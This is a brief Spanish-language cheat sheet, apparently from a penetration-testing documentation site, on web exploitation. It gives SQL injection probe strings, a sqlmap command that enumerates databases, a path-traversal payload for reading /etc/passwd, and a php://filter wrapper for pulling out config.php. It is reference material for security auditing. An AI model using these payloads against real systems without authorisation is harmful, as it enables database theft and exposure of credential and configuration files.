---
title: Explotación Web
description: Guía táctica de OWASP Top 10 y explotación de aplicaciones web.
sidebar:
  order: 1
---

# 🕸️ Guías de Explotación Web

Metodologías detalladas para auditar y explotar vulnerabilidades lógicas e infraestructuras web.

---

## 💉 SQL Injection (SQLi)

### Detección Manual Básica
Probar inyección en parámetros de consulta usando caracteres especiales:
```text
' OR 1=1-- -
" OR 1=1-- -
admin' --
admin' #
```

### Automatización (SQLMap)
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
```

---

## 📂 Local File Inclusion (LFI) / RFI

### LFI Básico
```text
http://target.com/index.php?page=../../../../etc/passwd
```

### Wrapper PHP para Exfiltración (Base64)
```text
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
